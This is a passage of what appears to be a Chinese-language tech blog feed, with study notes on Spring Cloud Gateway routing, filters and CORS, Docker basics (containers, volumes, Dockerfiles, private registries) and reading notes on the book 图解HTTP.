路径断言，判断路径是否以/user开头，如果是则符合        - id: order-service          uri: lb://orderservice          predicates:            - Path=/order/**</code></pre></li></ul><p><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/%E7%BD%91%E5%85%B3%E6%9C%8D%E5%8A%A1%E5%9B%BE%E8%A7%A3.jpg" alt="网关服务图解"></p><h3 id="03-%E6%96%AD%E8%A8%80%E5%B7%A5%E5%8E%82" tabindex="-1">03 断言工厂</h3><ul><li>在配置文件中写的断言规则只是字符串，这些字符串会被Pred Factory读取并处理，转变为路由判断的条件</li></ul><p><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/%E6%96%AD%E8%A8%80%E5%B7%A5%E5%8E%82.jpg" alt></p><p>具体使用可以参考<a href="https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/">官网</a></p><h3 id="04-%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B7%A5%E5%8E%82" tabindex="-1">04 过滤器工厂</h3><ul><li>路由过滤器GatewayFilter<ul><li>GatewaFilter是网关中提供的一种过滤器，可以对进入网关的请求和微服务返回的响应做处理</li><li>Spring提供了31种不同的路由过滤器工厂，同样详见<a href="https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/">官网</a></li></ul><pre><code class="language-yml">spring:  application:    name: gateway  cloud:    gateway:      routes:        - id: user-service # 路由标识          uri: lb://userservice #路由的目标地址          predicates: #路由断言，判断请求是否符合规则           - Path=/user/** # 路径断言，判断路径是否以/user开头，如果是则符合        - id: order-service          uri: lb://orderservice          predicates:           - Path=/order/**          filters:            - AddRequestHeader = &quot;&quot; # 添加请求头      #default-filters: 这个是全路由过滤器，对所有的路由都生效，与routes平级        #- AddRequestHeader = &quot;&quot; # 添加请求头</code></pre></li></ul><h3 id="05-%E5%85%A8%E5%B1%80%E8%BF%87%E6%BB%A4%E5%99%A8" tabindex="-1">05 全局过滤器</h3><ul><li>全局过滤器GlobalFilter的作用也是处理一切进入网关的请求和微服务响应，与GatewayFilter作用一样。</li><li>区别是GatewaFilter通过配置定义，处理逻辑是固定的。而GlobalFilter的逻辑需要自己写代码实现，定义方法是实现GlobalFilter接口</li><li>实现全局过滤器的步骤<ul><li><ol><li>实现GlobalFilter接口</li></ol></li><li><ol start="2"><li>添加@Order注解或实现Ordered接口</li></ol></li><li><ol start="3"><li>编写处理逻辑</li></ol></li></ul></li></ul><pre><code class="language-java">@Order(-1)//设置优先级@Component//beanpublic class AuthorizeFilter implements GlobalFilter &#123;    @Override    public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) &#123;        // 1. 获取请求参数        MultiValueMap&lt;String,String&gt; params = exchange.getRequest().getQueryParams();;        // 2. 获取参数中的authorization参数        String auth = params.getFirst(&quot;authorization&quot;);        // 3. 判断参数值是否为admin        if(&quot;admin&quot;.equals(auth))&#123;            // 4. 是，放行            return chain.filter(exchange);        &#125;        // 5. 否，拦截        exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);        return exchange.getResponse().setComplete();    &#125;&#125;</code></pre><ul><li>过滤器执行顺序<ul><li>请求进入网关后会碰到三类过滤器：当前路由的过滤器，DefaultFilter，GlobalFilter。请求路由后，会将当前路由过滤器和DefaultFilter，GlobalFilter合并到一个过滤器链（集合）中，排序后依次执行每个过滤器</li><li>每一个过滤器都必须指定一个int类型的order值，order值越小，优先级越高，执行顺序越靠前。</li><li>GlobalFilter通过实现Ordered接口或者添加@Order注解来指定order值，有编码者自己指定</li><li>路由过滤器和defaultFilter的order由Spring指定，默认是按照声明顺序从1递增</li><li>当过滤器的order值一样时，会按照 defaultFilter&gt;路由过滤器&gt;GlobalFilter的顺序执行</li></ul></li></ul><h3 id="06-%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86" tabindex="-1">06 跨域问题处理</h3><ul><li>跨域：域名不一致就是跨域，主要包括<ul><li>域名不同</li><li>域名相同，端口不同：</li></ul></li><li>跨域问题：浏览器禁止请求的发起者与服务端发生跨域ajax请求，请求被浏览器拦截的问题</li><li>解决方案：CORS</li><li>gateway已经实现CORS，使用者需要配置</li></ul><pre><code class="language-yml">spring:  cloud:    gateway:      globalcors: # 全局的跨域处理        add-to-simple-url-handler-mapping: true # 解决options请求被拦截问题        corsConfigurations:          '[/**]':            allowedOrigins: # 允许哪些网站的跨域请求              - &quot;http://localhost:8090&quot;              - &quot;http://www.leyou.com&quot;            allowedMethods: # 允许的跨域ajax的请求方式              - &quot;GET&quot;              - &quot;POST&quot;              - &quot;DELETE&quot;              - &quot;PUT&quot;              - &quot;OPTIONS&quot;            allowedHeaders: &quot;*&quot; # 允许在请求中携带的头信息            allowCredentials: true # 是否允许携带cookie            maxAge: 360000 # 这次跨域检测的有效期</code></pre><h2 id="docker" tabindex="-1">Docker</h2><h3 id="01-%E5%88%9D%E5%A7%8Bdocker" tabindex="-1">01 初始Docker</h3><ul><li><p>什么是Docker？</p><ul><li>项目部署问题：大型项目组件较多，运行环境也较为复杂，部署时会碰到一些问题<ul><li>依赖关系复杂，容易产生兼容性问题</li><li>开发，测试，生产环境有差异</li></ul></li><li>Docker如何解决依赖的兼容问题<ul><li>将应用的Libs(函数库)，Deps(依赖)，配置和应用一起打包</li><li>将每个应用放到一个隔离容器去运行，避免相互干扰</li></ul></li><li>Docker如何解决不同系统环境的问题<ul><li>Docker将用户程序与所需要调用的系统(比如Ubuntu)函数库一起打包</li><li>Docker运行到不同操作系统时，直接基于打包的库函数，借助于操作系统的Linux内核来运行</li><li>即Docker镜像中包含完整的运行环境，包含系统函数库，仅依赖系统的Linux内核，因此可以在任意Linux操作系统上运行</li></ul></li></ul></li><li><p>Docker和虚拟机的差异</p><ul><li>docker是一个系统进程；虚拟机是在操作系统中的操作系统</li><li>docker体积小，启动速度快，性能好；虚拟机体积大，启动速度慢，性能一般</li></ul></li><li><p>Docker架构</p><ul><li>镜像和容器<ul><li>镜像(Image):Docker将应用程序及其所需依赖，函数库，环境，配置等文件打包在一起，称为镜像</li><li>容器(Container):镜像中的应用程序运行后形成的进程就是容器，只是docker会给容器做隔离，对外不可见</li></ul></li><li>Docker和DockerHub<ul><li>DockerHub：是一个Docker镜像的托管平台，这样的平台称为Docker Registry</li><li>国内有类似DockerHub的公开服务，如网易云镜像服务，阿里云镜像服务</li></ul></li><li>Docker是一个CS架构，由两部分组成<ul><li>服务端(server):Docker守护进程，负责处理Docker指令，管理镜像，容器等</li><li>客户端(client):通过命令或RestAPI向Docker服务端发送指令。可以在本地或远程向服务端发送指令</li></ul></li></ul></li><li><p>安装Docker<br><a href="https://www.bilibili.com/video/BV1LQ4y127n4/?p=46&amp;spm_id_from=pageDriver&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">跟着视频按即可</a></p></li></ul><h3 id="02-docker%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C" tabindex="-1">02 Docker基本操作</h3><h4 id="%E9%95%9C%E5%83%8F%E6%93%8D%E4%BD%9C" tabindex="-1">镜像操作</h4><p><img src="../../images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/Docker%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C.jpg" alt="Docker基本操作"><br>主要是查看文档</p><h4 id="%E5%AE%B9%E5%99%A8%E6%93%8D%E4%BD%9C" tabindex="-1">容器操作</h4><p><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/Docker%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4.jpg" alt="Docker相关命令"></p><ul><li><p>创建一个Nginx容器</p><ul><li>去docker hub查看Nginx的容器的命令<br><code>docker run --name containerName -p 80:80 -d nginx</code><ul><li>命令解读：<ul><li>docker run:创建并运行一个容器</li><li>–name：给容器起一个名字，比如叫做mn</li><li>-p：将宿主机端口与容器端口映射，冒号左边是宿主机端口，右侧是容器端口</li><li>-d：后台运行容器</li><li>nginx：镜像名称</li></ul></li></ul></li></ul></li><li><p>查看容器日志的命令：</p><ul><li><code>docker logs</code></li><li>添加-f参数可以持续查看日志</li></ul></li><li><p>查看容器状态：<code>docker ps</code></p></li><li><p>删除容器<code>docker rm</code></p></li><li><p>案例操作示例：</p><ul><li>进入Nginx容器，修改HTML文件内容，添加“HELLO WORLD”：进入容器使用命令<code>docker exec -it containerName bash</code><ul><li>命令解读<ul><li>docker exec:进入容器内部</li><li>-it：给当前进入的容器创建一个标准输入，输出终端，允许我们与容器交互</li><li>containerName：要进去的容器的名称</li><li>bash：进入容器后执行的命令</li></ul></li></ul></li><li>创建并运行一个redis容器，并且支持数据持久化<ul><li><ol><li>到DockerHub搜索redis镜像</li></ol></li><li><ol start="2"><li>查看Redis镜像文档中的帮助信息</li></ol></li><li><ol start="3"><li>利用docker run命令运行一个Redis容器</li></ol></li></ul></li></ul></li></ul><h4 id="%E6%95%B0%E6%8D%AE%E5%8D%B7%EF%BC%88%E5%AE%B9%E5%99%A8%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86%EF%BC%89" tabindex="-1">数据卷（容器数据管理）</h4><ul><li><p>容器和数据耦合问题</p><ul><li><ol><li>不便于修改：当我们要修改Nginx的html内容时，需要进入容器内部修改，很不方便</li></ol></li><li><ol start="2"><li>数据不可复用：在容器内的修改对外是不可见的。所有修改对新创建的容器是不可复用的</li></ol></li><li><ol start="3"><li>升级维护困难，数据在容器内，如果要升级必然删除旧容器，所有数据会丢失</li></ol></li></ul></li><li><p>数据卷</p><ul><li>感觉和C++的指针很像，Container调用指向宿主文件系统的某个目录的指针<br><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/Docker%E6%95%B0%E6%8D%AE%E5%8D%B7.jpg" alt="Docker数据卷"></li></ul></li><li><p>操作数据卷</p><ul><li>数据卷操作基本语法：<code>docker volume [COMMAND]</code><ul><li>create 创建一个volume</li><li>inspect 显示一个或多个volume的信息</li><li>ls  列出所有volume</li><li>prune 删除未使用的volume</li><li>rm 删除一个或多个指定的volume</li></ul></li><li>操作案例：创建一个数据卷，并查看数据卷在宿主机的目录位置</li></ul></li><li><p>挂载数据卷</p><ul><li>创建容器时，可以通过-v参数来挂载一个数据卷到某个容器目录</li><li>举例<code>docker run --name mn -v html:/root/html -p 8080:80 nginx</code><ul><li>docker run 创建并运行容器</li><li>–name mn：给容器起名叫mn</li><li>-v html:/root/html: 将html数据卷挂载到容器内/root/html这个目录中</li><li>-p 8080:80: 将宿主机的8080端口映射到容器内的80端口</li><li>ngnix：镜像名称</li></ul></li><li>案例：创建一个ngnix容器，修改html目录内index.html的内容（通过数据卷挂载）</li></ul></li><li><p>如果容器运行时volume不存在，会自动被创建出来</p></li></ul><h4 id="%E6%A1%88%E4%BE%8B%EF%BC%9A%E5%88%9B%E5%BB%BA%E5%B9%B6%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AAmysql%E5%AE%B9%E5%99%A8%EF%BC%8C%E5%B0%86%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9B%AE%E5%BD%95%E7%9B%B4%E6%8E%A5%E6%8C%82%E8%BD%BD%E5%88%B0%E5%AE%B9%E5%99%A8%E4%B8%AD" tabindex="-1">案例：创建并运行一个MySQL容器，将宿主机目录直接挂载到容器中</h4><p>见视频，这里使用<code> docker pull mysql</code>直接拉取最新docker镜像</p><h4 id="%E6%80%BB%E7%BB%93" tabindex="-1">总结</h4><ul><li><ol><li>docker run的命令通过-v参数挂载文件或目录到容器中</li></ol><ul><li><ol><li>-v volume名称：容器内目录</li></ol></li><li><ol start="2"><li>-v 宿主机文件: 容器内文件</li></ol></li><li><ol start="3"><li>-v 宿主机目录：容器内目录</li></ol></li></ul></li><li><ol start="2"><li>数据卷挂载与目录直接挂载的</li></ol><ul><li><ol><li>数据卷挂载耦合度低，由docker来管理目录，但是目录较深，不好寻找</li></ol></li><li><ol start="2"><li>目录挂载耦合度较高，需要自己记录管理目录，但便于寻找</li></ol></li></ul></li></ul><h3 id="03-dockerfile%E8%87%AA%E5%AE%9A%E4%B9%89%E9%95%9C%E5%83%8F" tabindex="-1">03 Dockerfile自定义镜像</h3><h4 id="%E9%95%9C%E5%83%8F%E7%BB%93%E6%9E%84" tabindex="-1">镜像结构</h4><ul><li><p>镜像是将应用程序及其所需的系统函数库，环境，配置，依赖打包而成<br><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/%E9%95%9C%E5%83%8F%E7%BB%93%E6%9E%84.jpg" alt="镜像结构"></p></li><li><p>镜像是分层结构：</p><ul><li>BaseImage层：包含基本的系统函数库，环境变量，文件系统</li><li>Entrypoint：入口，是镜像中应用启动的命令</li><li>其它：在BaseImage基础上添加依赖，安装程序，完成整个应用的安装和配置</li></ul></li></ul><h4 id="dockfile%E8%AF%AD%E6%B3%95" tabindex="-1">Dockfile语法</h4><p>Dockerfile就是一个文本文件，其中包含一个个指令（Instruction），用指令来说明要执行什么操作来构建镜像，每一个指令会形成一层Layer</p><table><thead><tr><th>指令</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>FROM</td><td>指定基础镜像</td><td>FROM centos:7</td></tr><tr><td>ENV</td><td>设置环境变量</td><td>ENV key value</td></tr><tr><td>COPY</td><td>拷贝本地文件到镜像的指定目录</td><td>COPY ./mysql-5.7.rpm /tmp</td></tr><tr><td>RUN</td><td>执行Linux的shell命令，一般是安装过程的命令</td><td>RUN yum install gcc</td></tr><tr><td>EXPOSE</td><td>指定容器运行时监听的端口，是给镜像使用者看的</td><td>EXPOSE 8080</td></tr><tr><td>ENTRYPOINT</td><td>镜像中应用的启动命令，容器运行时调用</td><td>ENTRY java -jar xx.jar</td></tr></tbody></table><h4 id="%E6%9E%84%E5%BB%BAjava%E9%A1%B9%E7%9B%AE" tabindex="-1">构建Java项目</h4><p><a href="https://www.bilibili.com/video/BV1LQ4y127n4/?p=57&amp;spm_id_from=pageDriver&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">视频地址</a></p><ul><li><p>案例：基于centos创建一个新景象，运行一个java项目</p><ul><li><ol><li>新建一个空文件夹docker-demo</li></ol></li><li><ol start="2"><li>拷贝jar文件到该目录</li></ol></li><li><ol start="3"><li>拷贝jdk8.tar.gz到该目录</li></ol></li><li><ol start="4"><li>拷贝Dockerfile文件到该目录</li></ol></li><li><ol start="5"><li>进入docker-demo</li></ol></li><li><ol start="6"><li>运行命令<code>docker build -t javaweb:1.0</code></li></ol></li></ul></li><li><p>基于java：8-alpine镜像，将一个Java项目构建为镜像</p><ul><li>该镜像可以直接构建java镜像环境</li><li><ol><li>新建空目录，其中新建文件Dockerfile</li></ol></li><li><ol start="2"><li>将jar包拷贝到这个目录</li></ol></li><li><ol start="3"><li>编写Dockerfile文件</li></ol><ul><li><ol><li>基于java:8-alpine作为基础镜像</li></ol></li><li><ol start="2"><li>将app.jar拷贝到镜像</li></ol></li><li><ol start="3"><li>暴露端口</li></ol></li><li><ol start="4"><li>编写入口ENTRYPOINT</li></ol></li></ul></li><li><ol start="4"><li>使用docker build命令构建镜像</li></ol></li><li><ol start="5"><li>使用docker run创建容器并运行</li></ol></li></ul></li></ul><h4 id="%E6%80%BB%E7%BB%93-1" tabindex="-1">总结</h4><ul><li><ol><li>Dockerfile本质是一个文件，通过指令描述镜像的构建过程</li></ol></li><li><ol start="2"><li>Dockerfile的第一行必须是FROM，从一个基础镜像来构建</li></ol></li><li><ol start="3"><li>基础镜像可以是基本操作系统，如centos，也可以是其他人制作好的镜像，如java:8-alpine</li></ol></li></ul><h3 id="04-dockercompose" tabindex="-1">04 DockerCompose</h3><h4 id="%E8%AE%A4%E8%AF%86dockercompose" tabindex="-1">认识DockerCompose</h4><ul><li>什么是DockerCompose<ul><li>DockerCompose可以基于Compose文件帮我们快速的部署分布式应用，而无需手动一个个创建和运行容器</li><li>Compose文件是一个文本文件，可以通过定义集群中的每个容器如何运行</li></ul></li><li>DockerCompose的安装</li></ul><h4 id="%E9%83%A8%E7%BD%B2%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%9B%86%E7%BE%A4" tabindex="-1">部署微服务集群</h4><h3 id="05-docker%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93" tabindex="-1">05 Docker镜像仓库</h3><h4 id="%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93" tabindex="-1">搭建私有镜像仓库</h4><ul><li>镜像仓库有公有的和私有的两种形式<ul><li>公共仓库：例如Docker官方Docker Hub，网易云镜像服务，阿里云镜像服务等</li><li>除使用公开仓库外，用户可以在本地搭建Docker Registry。企业自己的镜像最好是采用私有Docker Registry来实现</li></ul></li><li>创建过程，看视频</li></ul><h4 id="%E5%90%91%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93%E6%8E%A8%E9%80%81%E9%95%9C%E5%83%8F" tabindex="-1">向镜像仓库推送镜像</h4><p>推送镜像到私有镜像服务必须先tag，步骤如下：</p><ol><li>重新tag本地镜像，名称前缀为私有仓库的地址：ip:8080/<code>docker tag ngnix:latest ip:8080/nginx:1.0</code></li><li>推送镜像<code>docker push ip:8080/nginx:1.0</code></li><li>拉取镜像<code>docker pull ip:8080/nginx:1.0</code></li></ol><h4 id="%E6%80%BB%E7%BB%93-2" tabindex="-1">总结</h4><ol><li>推送本地镜像仓库前都必须重命名(docker tag)镜像，以镜像仓库地址为前缀</li><li>镜像仓库推送前需要把仓库地址配置到docker服务的daemon.json文件中，被docker信任</li><li>推送使用docker push命令</li><li>拉取使用docker pull命令</li></ol><h2 id="mq" tabindex="-1">MQ</h2><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> web </tag>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图解HTTP</title>
      <link href="/2023/08/16/web/%E5%9B%BE%E8%A7%A3HTTP/"/>
      <url>/2023/08/16/web/%E5%9B%BE%E8%A7%A3HTTP/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/x_x.jpg" alt></p><p>本文章为阅读图解HTTP（上野宣）这一书籍的读书笔记</p><h2 id="%E7%AC%AC%E4%B8%80%E7%AB%A0-%E4%BA%86%E8%A7%A3web%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80" tabindex="-1">第一章 了解Web及网络基础</h2><ul><li>Web通过一种名为HTTP（HyperText Transfer Protocol，超文本传输协议）作为规范，完成客户端到服务器端的一系列运行流程</li></ul><h3 id="1-tcp%2Fip" tabindex="-1">1 TCP/IP</h3><ul><li><p>TCP/IP协议族，分为4层</p><ul><li>应用层：向用户提供应用服务时通信的活动。<ul><li>协议：FTP（File Transfer Protocol，文件传输协议）和 DNS（Domain Name System，域名系统），HTTP</li></ul></li><li>传输层：对上层应用层，提供处于网络连接中的两台计算机之间的数据传输<ul><li>协议：TCP（Transmission Control Protocol，传输控制协议）和 UDP（User Data Protocol，用户数据报协议）</li></ul></li><li>网络层：用来处理在网络上流动的数据包。数据包是网络传输的最小数据单位。<ul><li>该层规定了通过怎样的路径（所谓的传输路线）到达对方计算机，并把数据包传送给对方。</li></ul></li><li>链路层（又名数据链路层，网络接口层）：用来处理连接网络的硬件部分。<ul><li>包括控制操作系统、硬件的设备驱动、NIC（Network Interface Card，网络适配器，即网卡），及光纤等物理可见部分（还包括连接器等一切传输媒介）。硬件上的范畴均在链路层的作用范围之内。</li></ul></li></ul></li><li><p>TCP/IP通信传输流</p><ul><li><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/1_1.jpg" alt></li><li>发送端在层与层之间传输数据时，每经过一层时必定会被打上一个该层所属的首部信息。反之，接收端在层与层传输数据时，每经过一层时会把对应的首部消去。</li><li>这种把数据信息包装起来的做法称为封装（encapsulate）</li></ul></li></ul><h3 id="2-%E4%B8%8E-http-%E5%85%B3%E7%B3%BB%E5%AF%86%E5%88%87%E7%9A%84%E5%8D%8F%E8%AE%AE%EF%BC%9Aip%E3%80%81tcp-%E5%92%8C-dns" tabindex="-1">2 与 HTTP 关系密切的协议：IP、TCP 和 DNS</h3><ul><li><p>负责传输的IP协议</p><ul><li>IP（Internet Protocol）网际协议位于网络层。</li><li>IP 协议的作用是把各种数据包传送给对方。而要保证确实传送到对方那里，则需要满足各类条件。其中两个重要的条件是 IP 地址和 MAC地址（Media Access Control Address）</li><li>IP 地址指明了节点被分配到的地址，MAC 地址是指网卡所属的固定地址。IP 地址可以和 MAC 地址进行配对。IP 地址可变换，但 MAC地址基本上不会更改</li><li>使用 ARP 协议凭借 MAC 地址进行通信：ARP 是一种用以解析地址的协议，根据通信方的 IP 地址就可以反查出对应的 MAC 地址。</li><li>在到达通信目标前的中转过程中，那些计算机和路由器等网络设备只能获悉很粗略的传输路线。这种机制称为路由选择（routing）</li></ul></li><li><p>确保可靠性的TPC协议</p><ul><li>TCP 位于传输层，提供可靠的字节流服务。<ul><li>字节流服务（Byte Stream Service）是指，为了方便传输，将大块数据分割成以报文段（segment）为单位的数据包进行管理。</li><li>可靠的传输服务是指，能够把数据准确可靠地传给对方。</li><li>为了准确无误地将数据送达目标处，TCP 协议采用了三次握手（three-way handshaking）策略。<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/1_2.jpg" alt></li></ul></li></ul></li><li><p>负责域名解析的DNS服务</p><ul><li>应用层协议，提供域名到 IP 地址之间的解析服务。</li></ul></li><li><p>HTTP协议和各个协议的关系：<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/1_3.jpg" alt></p></li></ul><h3 id="3-uri%E5%92%8Curl" tabindex="-1">3 URI和URL</h3><ul><li><p>URI（Uniform Resource Identifier，统一资源标识符）</p></li><li><p>URL（Uniform Resource Locator，统一资源定位符）</p></li><li><p>URL 是 URI 的子集</p></li><li><p>URI格式</p><ul><li>绝对URI格式：<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/1_4.jpg" alt></li><li>协议方案名：<ul><li>使用 http: 或 https: 等协议方案名获取访问资源时要指定协议类型。不区分字母大小写，最后附一个冒号。</li><li>也可使用 data: 或 javascript: 这类指定数据或脚本程序的方案名。</li></ul></li><li>登录信息（认证）：指定用户名和密码作为从服务器端获取资源时必要的登录信息（身份认证）。此项是可选项</li><li>服务器地址</li><li>服务器端口号</li><li>带层次的文件路径</li><li>查询字符串</li><li>片段标识符</li></ul></li></ul><h3 id="4-rfc%EF%BC%88request-for-comments%EF%BC%8C%E5%BE%81%E6%B1%82%E4%BF%AE%E6%AD%A3%E6%84%8F%E8%A7%81%E4%B9%A6%EF%BC%89" tabindex="-1">4 RFC（Request for Comments，征求修正意见书）</h3><p>RFC是互联网的设计文档，一般应用程序要遵照RFC确定的标准实现</p><h2 id="%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%AE%80%E5%8D%95%E7%9A%84http%E5%8D%8F%E8%AE%AE" tabindex="-1">第二章 简单的HTTP协议</h2><ul><li><p>HTTP 协议用于客户端和服务器端之间的通信</p></li><li><p>通过请求和响应的交换达成通信</p><ul><li>客户端发送请求报文</li><li>服务器返回相应报文</li></ul></li><li><p>HTTP是不保存状态的协议，即无状态（stateless）协议。</p><ul><li>HTTP/1.1 虽然是无状态协议，但为了实现期望的保持状态功能，于是引入了 Cookie 技术。有了 Cookie 再用 HTTP 协议通信，就可以管理状态了。</li></ul></li><li><p>请求URI定位资源</p><ul><li>HTTP 协议使用 URI 定位互联网上的资源。正是因为 URI 的特定功能，在互联网上任意位置的资源都能访问到。</li></ul></li><li><p>告知服务器意图的HTTP方法</p><ul><li>GET：获取资源</li><li>POST：传输实体主体</li><li>PUT：传输文件</li><li>HEAD：获得报文首部。HEAD 方法和 GET 方法一样，只是不返回报文主体部分。用于确认URI 的有效性及资源更新的日期时间</li><li>DELETE：删除文件</li><li>OPTIONS：询问支持的方法，OPTIONS 方法用来查询针对请求 URI 指定的资源支持的方法。</li><li>TRACE：追踪路径，让 Web 服务器端将之前的请求通信环回给客户端的方法。</li><li>CONNECT：要求用隧道协议连接代理<ul><li>CONNECT 方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行 TCP 通信。主要使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输</li></ul></li></ul></li><li><p>持久连接节省通信量</p><ul><li>持久连接的特点：只要任意一端没有明确提出断开连接，则保持 TCP 连接状态。</li><li>持久连接的好处在于减少了 TCP 连接的重复建立和断开所造成的额外开销，减轻了服务器端的负载。</li><li>持久连接使得多数请求以流水线化（pipelining）方式发送成为可能。这样就能够做到同时并行发送多个请求，而不需要一个接一个地等待响应了。</li></ul></li><li><p>使用Cookie的状态管理</p><ul><li>Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态。<ul><li>Cookie 会根据从服务器端发送的响应报文内的一个叫做 Set-Cookie的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。</li><li>服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。</li></ul></li></ul></li></ul><h2 id="%E7%AC%AC%E4%B8%89%E7%AB%A0-http%E6%8A%A5%E6%96%87%E5%86%85%E7%9A%84http%E4%BF%A1%E6%81%AF" tabindex="-1">第三章 HTTP报文内的HTTP信息</h2><ul><li>用于 HTTP 协议交互的信息被称为 HTTP 报文。请求端（客户端）的HTTP 报文叫做请求报文，响应端（服务器端）的叫做响应报文。</li><li>HTTP 报文大致可分为报文首部和报文主体两块。两者由最初出现的空行（CR+LF）来划分。通常，并不一定要有报文主体。</li></ul><h3 id="1-%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84" tabindex="-1">1 报文结构</h3><p><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/3_1.jpg" alt><br><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/3_2.jpg" alt></p><ul><li>请求报文和响应报文的<strong>首部</strong>由以下数据组成<ul><li>请求行：包含用于请求的方法，请求URI和HTTP的版本</li><li>状态行：包含表明响应结果的状态码，原因短语和HTTP版本</li><li>首部字段：包含表示请求和响应的各种条件和属性的各类首部<ul><li>一般有4种首部：通用首部，请求首部，响应首部，实体首部</li></ul></li><li>其它：可能包含HTTP的RFC里未定义的首部（Cookie等）</li></ul></li></ul><h3 id="2-%E7%BC%96%E7%A0%81%E6%8F%90%E5%8D%87%E4%BC%A0%E8%BE%93%E6%95%88%E7%8E%87" tabindex="-1">2 编码提升传输效率</h3><ul><li><p>HTTP在传输数据时可以按照数据原貌进行直接传输，也可以通过在传输过程中编码提升传输效率</p></li><li><p>在传输时编码，可以处理大量访问请求，但编码解码需要CPU来完成，消耗更多CPU资源</p></li><li><p>报文：是HTTP通信种的基本单位，由8位组字节流则称，通过HTTP通信传输</p></li><li><p>实体：作为请求或响应的有效载荷数据被传输，其内容由实体首部和实体主体组成</p></li><li><p>HTTP报文的主体用于传输请求或响应主体，通常报文主体等于实体主体，但实体主体可能会进行编码操作</p><ul><li>常用内容编码：<ul><li>gzip（GNU zip）</li><li>compress（UNIX 系统的标准压缩）</li><li>deflate（zlib）</li><li>identity（不进行编码）</li></ul></li></ul></li><li><p>分块传输编码：将实体主体分块传送</p></li></ul><h3 id="3-%E5%8F%91%E9%80%81%E5%A4%9A%E7%A7%8D%E6%95%B0%E6%8D%AE%E7%9A%84%E5%A4%9A%E9%83%A8%E5%88%86%E5%AF%B9%E8%B1%A1%E9%9B%86%E5%90%88" tabindex="-1">3 发送多种数据的多部分对象集合</h3><ul><li>发送邮件时，可以在邮件中写入文字并添加多份附件，这是因为采用了MIME（Multipurpose Internet Mail Extensions，多用途因特网邮件扩展）机制，其允许邮件处理文本，图片，视频等多个不同类型的数据</li><li>HTTP中也采纳了多部份对象集合，发送一份报文主体内可包含多类型实体<ul><li>HTTP 报文中使用多部分对象集合时，需要在首部字段里加上Content-type。</li></ul></li></ul><h3 id="4-%E8%8E%B7%E5%8F%96%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9%E7%9A%84%E8%8C%83%E5%9B%B4%E8%AF%B7%E6%B1%82" tabindex="-1">4 获取部分内容的范围请求</h3><p>执行范围请求时，会使用首部字段Range来指定资源的byte范围</p><ul><li><p>5001-10000字节：Range: bytes=5001-10000</p></li><li><p>从5001字节之后：Range: bytes=5001-</p></li><li><p>从一开始到 3000 字节和 5000~7000 字节的多重范围：Range: bytes=-3000, 5000-7000</p></li><li><p>针对范围请求，响应会返回状态码为 206 Partial Content 的响应报文。另外，对于多重范围的范围请求，响应会在首部字段 Content-Type标明 multipart/byteranges 后返回响应报文。</p></li><li><p>如果服务器端无法响应范围请求，则会返回状态码 200 OK 和完整的实体内容。</p></li></ul><h3 id="5-%E5%86%85%E5%AE%B9%E5%8D%8F%E5%95%86%E8%BF%94%E5%9B%9E%E6%9C%80%E5%90%88%E9%80%82%E7%9A%84%E5%86%85%E5%AE%B9" tabindex="-1">5 